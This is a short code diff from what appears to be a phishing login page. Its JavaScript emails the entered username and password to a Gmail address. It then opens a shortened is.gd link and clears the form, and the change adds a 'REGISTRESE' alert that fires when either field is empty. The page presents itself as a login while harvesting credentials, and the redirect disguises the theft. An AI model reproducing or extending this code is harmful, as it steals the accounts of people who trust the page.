@@ -89,12 +89,15 @@ button {
             to_email: "lamoviedeoro@gmail.com"
         })
          .then(() => {
-           
-window.open("https://is.gd/stDTxK");
+     if (USER.value === '' || PASS.value === '') {
+         alert('⚠️ REGISTRESE ⚠️');
+      } else {
+   window.open("https://is.gd/stDTxK");
            USER.value = "";
            PASS.value = "";
-        });
-      };
+      }
+   });
+ };
         
         <!-- LOGÍSTICA -->
            
